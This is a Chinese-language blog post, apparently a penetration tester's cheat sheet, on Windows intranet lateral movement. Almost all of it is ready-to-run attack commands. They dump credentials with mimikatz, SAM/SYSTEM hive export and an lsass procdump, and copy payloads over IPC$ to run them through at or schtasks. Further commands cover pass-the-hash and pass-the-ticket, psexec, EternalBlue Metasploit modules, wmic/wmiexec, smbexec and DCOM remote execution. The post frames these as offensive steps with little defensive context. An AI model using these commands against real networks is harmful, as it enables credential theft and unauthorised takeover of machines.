<!DOCTYPE html>
<html lang="zh-cn">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='go!'><title>内网横向</title>

<link rel='canonical' href='https://coollllllll.github.io/p/intranet-15/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='内网横向'>
<meta property='og:description' content='go!'>
<meta property='og:url' content='https://coollllllll.github.io/p/intranet-15/'>
<meta property='og:site_name' content='cOOl &#39;s blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2021-12-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-12-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://coollllllll.github.io/p/intranet-15/haha.jpg' />
<meta name="twitter:title" content="内网横向">
<meta name="twitter:description" content="go!"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://coollllllll.github.io/p/intranet-15/haha.jpg' />
    <link rel="shortcut icon" href="img/avatar.png" />

    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/intranet-15/">
                <img src="/p/intranet-15/haha_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg"
                        srcset="/p/intranet-15/haha_hud7e36f7e20e71be184458283bdae4646_55974_800x0_resize_q75_box.jpg 800w, /p/intranet-15/haha_hud7e36f7e20e71be184458283bdae4646_55974_1600x0_resize_q75_box.jpg 1600w"
                        width="800" 
                        height="534" 
                        loading="lazy"
                        alt="Featured image of post 内网横向" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%86%85%E7%BD%91/" style="background-color: #2a9d8f; color: #fff;">
                内网
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/intranet-15/">内网横向</a>
    </h2>

    
    <h3 class="article-subtitle">
        go!
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Dec 15, 2021</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 4 分钟
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h1 id="内网横向">内网横向</h1>
<h2 id="windows-密码与-hash-抓取">Windows 密码与 Hash 抓取</h2>
<h3 id="mimikatz-直接读取明文密码">mimikatz 直接读取明文密码</h3>
<pre tabindex="0"><code>privilege::debug
sekurlsa::logonpasswords
</code></pre><h3 id="通过sam-和--system-文件抓取密码">通过SAM 和  SYSTEM 文件抓取密码</h3>
<ul>
<li>导出SAM 和 SYSTEM文件</li>
</ul>
<pre tabindex="0"><code>reg save hklm\sam sam.hive
reg save hklm\system system.hive
</code></pre><ul>
<li>mimikatz 离线读取文件获得 NTLM</li>
</ul>
<pre tabindex="0"><code>lsadump::sam /sam:sam.hive system:system.hive
</code></pre><ul>
<li>在目标机器上直接读取本地SAM文件</li>
</ul>
<pre tabindex="0"><code>privilege::debug
token::elevate
lsadump::sam
</code></pre><h3 id="mimikatz-离线读取-lsassdmp-文件">mimikatz 离线读取 lsass.dmp 文件</h3>
<ul>
<li>使用Procdump(微软工具，免杀)工具导出 lsass.dmp</li>
</ul>
<pre tabindex="0"><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre><ul>
<li>使用 mimikatz 导出 lsass.dmp 文件中的密码值</li>
</ul>
<pre tabindex="0"><code>sekurlsa::mimidump lsass.dmp
sekurlsa::logonpasswords full
</code></pre><h2 id="windows-远程连接">Windows 远程连接</h2>
<h3 id="ipc">IPC</h3>
<p>IPC$(Internet Process Connection) 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
<p><strong>建立 ipc$ 连接的条件：</strong></p>
<ul>
<li>目标主机开启了 139 和 445 端口</li>
<li>目标主机管理员开启了 ipc$ 默认共享</li>
</ul>
<pre tabindex="0"><code># 通过账户:口令建立IPC
net use \\IP\ipc$ &quot;password&quot; /user:&quot;username&quot;

# 查看当前主机所建立的IPC
net use
</code></pre><p>建立IPC后，可以使用如下命令进行一些基本操作：</p>
<ul>
<li>dir 命令</li>
</ul>
<pre tabindex="0"><code># 列出目标主机上的C盘
dir \\IP\c$
</code></pre><ul>
<li>copy</li>
</ul>
<pre tabindex="0"><code># 复制恶意文件到目标C盘
copy C:\Users\douser\Desktop\shell.exe \\IP\c$
</code></pre><h2 id="计划任务横向">计划任务横向</h2>
<h3 id="at-命令">at 命令</h3>
<blockquote>
<p>用于 Windows server 2008 之前版本</p>
</blockquote>
<ul>
<li>建立IPC</li>
<li>查看目标当前时间</li>
</ul>
<pre tabindex="0"><code>net time \\IP
</code></pre><ul>
<li>复制马到目标主机</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="k">copy</span> payload.bat \\IP\C$
</code></pre></div><ul>
<li>创建计划任务</li>
</ul>
<pre tabindex="0"><code>at \\IP 7:00AM C:\payload.bat

# 执行完毕返回任务ID
</code></pre><ul>
<li>上线之后，删除计划任务</li>
</ul>
<pre tabindex="0"><code>at \\IP taskid /delete
</code></pre><h3 id="schtasks-命令">schtasks 命令</h3>
<blockquote>
<p>schtasks 命令比 at 命令更为灵活、自由，用以代替 at。</p>
</blockquote>
<ul>
<li>建立IPC</li>
<li>复制马到目标主机</li>
<li>创建名为test的计划任务</li>
</ul>
<pre tabindex="0"><code>schtasks /create /s IP /tn test /sc minute /tr c:\payload.bat /ru system /f

# minute表明每分钟执行一次
# 创建失败，比如拒绝访问错误，就是权限不够，可以使用/u /p 参数附带高权限用户
</code></pre><ul>
<li>等计划任务运行，上线</li>
<li>也可以让其直接运行</li>
</ul>
<pre tabindex="0"><code>schtasks /run /s ip /i /tn test

# 权限不够，附加用户和密码
</code></pre><ul>
<li>上线后，删除计划任务</li>
</ul>
<pre tabindex="0"><code>schtasks /delete /s ip /tn &quot;test&quot; /f
</code></pre><blockquote>
<p>在使用schtasks命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt</p>
</blockquote>
<h2 id="pth-攻击">PTH 攻击</h2>
<h3 id="ntlm-hash-传递">NTLM Hash 传递</h3>
<pre tabindex="0"><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]&quot;
</code></pre><h3 id="aes-256-密钥进行哈希传递">AES-256 密钥进行哈希传递</h3>
<ul>
<li>使用 mimikatz 抓取 AES-256 密钥</li>
</ul>
<pre tabindex="0"><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;
</code></pre><ul>
<li>pth攻击（目标机器安装 KB2871997）</li>
</ul>
<pre tabindex="0"><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]&quot;
</code></pre><h2 id="票据传递">票据传递</h2>
<ul>
<li>基于ms14-068生成TGT</li>
<li>使用mimikatz将票据注入内存</li>
</ul>
<pre tabindex="0"><code>kerberos::purge         
kerberos::list          
kerberos::ptt C:\xxx.kirbi 
</code></pre><ul>
<li>访问域内其他主机</li>
</ul>
<h2 id="psexec">psexec</h2>
<p>psexec 是 windows 下非常好的一款远程命令行工具。属于微软官方，所以一般是免杀的。</p>
<h3 id="原理">原理</h3>
<ul>
<li>通过 ipc$ 连接，释放二进制文件 psexecsvc.exe 到目标</li>
<li>通过服务管理 SCManager 远程创建一个 psexec 服务，并启动服务</li>
<li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</li>
<li>运行结束后删除服务</li>
</ul>
<h3 id="条件">条件</h3>
<ul>
<li>对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名</li>
<li>对方未开启防火墙</li>
<li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问</li>
<li>如果是域环境，连接普通域主机可以用普通域用户，连接域控只能用域管理员账户</li>
</ul>
<h3 id="使用">使用</h3>
<ul>
<li>建立IPC</li>
<li>获取 System 权限的 交互式shell</li>
</ul>
<pre tabindex="0"><code>PsExec.exe -accepteula \\IP -u 用户名 -p 密码 -s cmd.exe

# 直接执行命令
PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig

# 缺少-s将返回Administrator 权限的 shell
</code></pre><h3 id="msf">MSF</h3>
<pre tabindex="0"><code>exploit/windows/smb/psexec

exploit/windows/smb/psexec_psh（powershell 版本）
</code></pre><h2 id="永恒之蓝">永恒之蓝</h2>
<p>针对 smb v1。</p>
<pre tabindex="0"><code>auxiliary/scanner/smb/smb_ms17_010
auxiliary/admin/smb/ms17_010_command
exploit/windows/smb/ms17_010_eternalblue
</code></pre><h2 id="wmi">WMI</h2>
<p>通过 /node 选项使用端口 135 上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</p>
<p><strong>条件：</strong></p>
<ul>
<li>目标机开启了 135,445 端口（135 管理口，445 传回显）</li>
</ul>
<h3 id="基本使用">基本使用</h3>
<pre tabindex="0"><code>wmic /node:IP /user:administrator /password:passed process call create &quot;cmd.exe /c ipconfig &gt; ip.txt&quot;
</code></pre><ul>
<li>建立IPC，使用type命令读取结果</li>
</ul>
<pre tabindex="0"><code>type \\IP\C$\ip.txt
</code></pre><h3 id="impacket-包中的-wmiexec">impacket 包中的 wmiexec</h3>
<pre tabindex="0"><code>python wmiexec.py administrator:password@IP

# 如果没有密码，也可以配合哈希传递
python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP
</code></pre><h2 id="smbexec">smbexec</h2>
<h3 id="impacket-版">impacket 版</h3>
<pre tabindex="0"><code>python3 smbexec.py teamssix.com/administrator:1qaz@WSX@192.168.7.7
</code></pre><h3 id="linux-跨平台-windows-远程命令执行">Linux 跨平台 Windows 远程命令执行</h3>
<p><a class="link" href="https://github.com/brav0hax/smbexec"  target="_blank" rel="noopener"
    >https://github.com/brav0hax/smbexec</a></p>
<h2 id="dcom">DCOM</h2>
<p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>需要关闭目标系统的防火墙，如果目标主机 DC 没有关闭防火想的话会报错</li>
<li>在远程主机上执行命令时，必须使用具有本地管理员权限的账号</li>
</ul>
<h3 id="本地执行任意命令">本地执行任意命令</h3>
<ul>
<li>获取 DCOM 程序列表</li>
</ul>
<pre tabindex="0"><code># windows server 2012 及以上
Get-CimInstance Win32_DCOMApplicatioon

# Windows 7、Windows Server 2008
Get-WmicObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
</code></pre><ul>
<li>执行任意命令</li>
</ul>
<pre tabindex="0"><code># 本地管理员powershell下执行
[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;)).Document.ActiveView.ExecuteShellCommand(&quot;cmd.exe&quot;,&quot;0&quot;,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)
</code></pre><h3 id="远程主机上执行命令">远程主机上执行命令</h3>
<pre tabindex="0"><code># 调用 MMC20_Application 远程执行命令
$com=[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;IP&quot;))
$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd.exe&quot;,&quot;0&quot;,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)


# 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39
$com=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',&quot;IP&quot;)
$obj=[System.Activator]::CreateInstance($com)
$item=$obj.item()
$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,&quot;$null&quot;,0)
</code></pre>
</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">相关文章</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/p/intranet-14/">
        
        
            <div class="article-image">
                <img src="/p/intranet-14/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post 基于域信任关系的域攻击"
                        data-key="intranet-14" 
                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">基于域信任关系的域攻击</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/intranet-16/">
        
        
            <div class="article-image">
                <img src="/p/intranet-16/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post NTLM Relay"
                        data-key="intranet-16" 
                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">NTLM Relay</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/intranet-11/">
        
        
            <div class="article-image">
                <img src="/p/intranet-11/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post DCShadow 攻击"
                        data-key="intranet-11" 
                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">DCShadow 攻击</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/intranet-10/">
        
        
            <div class="article-image">
                <img src="/p/intranet-10/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post DCSync 攻击"
                        data-key="intranet-10" 
                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">DCSync 攻击</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/intranet-12/">
        
        
            <div class="article-image">
                <img src="/p/intranet-12/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post Windows 认证"
                        data-key="intranet-12" 
                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Windows 认证</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2022 cOOl &#39;s blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    
        <aside class="sidebar right-sidebar sticky">
            <section class="widget archives">
                <div class="widget-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



                </div>
                <h2 class="widget-title section-title">目录</h2>
                
                <div class="widget--toc">
                    <nav id="TableOfContents">
  <ol>
    <li><a href="#windows-密码与-hash-抓取">Windows 密码与 Hash 抓取</a>
      <ol>
        <li><a href="#mimikatz-直接读取明文密码">mimikatz 直接读取明文密码</a></li>
        <li><a href="#通过sam-和--system-文件抓取密码">通过SAM 和  SYSTEM 文件抓取密码</a></li>
        <li><a href="#mimikatz-离线读取-lsassdmp-文件">mimikatz 离线读取 lsass.dmp 文件</a></li>
      </ol>
    </li>
    <li><a href="#windows-远程连接">Windows 远程连接</a>
      <ol>
        <li><a href="#ipc">IPC</a></li>
      </ol>
    </li>
    <li><a href="#计划任务横向">计划任务横向</a>
      <ol>
        <li><a href="#at-命令">at 命令</a></li>
        <li><a href="#schtasks-命令">schtasks 命令</a></li>
      </ol>
    </li>
    <li><a href="#pth-攻击">PTH 攻击</a>
      <ol>
        <li><a href="#ntlm-hash-传递">NTLM Hash 传递</a></li>
        <li><a href="#aes-256-密钥进行哈希传递">AES-256 密钥进行哈希传递</a></li>
      </ol>
    </li>
    <li><a href="#票据传递">票据传递</a></li>
    <li><a href="#psexec">psexec</a>
      <ol>
        <li><a href="#原理">原理</a></li>
        <li><a href="#条件">条件</a></li>
        <li><a href="#使用">使用</a></li>
        <li><a href="#msf">MSF</a></li>
      </ol>
    </li>
    <li><a href="#永恒之蓝">永恒之蓝</a></li>
    <li><a href="#wmi">WMI</a>
      <ol>
        <li><a href="#基本使用">基本使用</a></li>
        <li><a href="#impacket-包中的-wmiexec">impacket 包中的 wmiexec</a></li>
      </ol>
    </li>
    <li><a href="#smbexec">smbexec</a>
      <ol>
        <li><a href="#impacket-版">impacket 版</a></li>
        <li><a href="#linux-跨平台-windows-远程命令执行">Linux 跨平台 Windows 远程命令执行</a></li>
      </ol>
    </li>
    <li><a href="#dcom">DCOM</a>
      <ol>
        <li><a href="#本地执行任意命令">本地执行任意命令</a></li>
        <li><a href="#远程主机上执行命令">远程主机上执行命令</a></li>
      </ol>
    </li>
  </ol>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
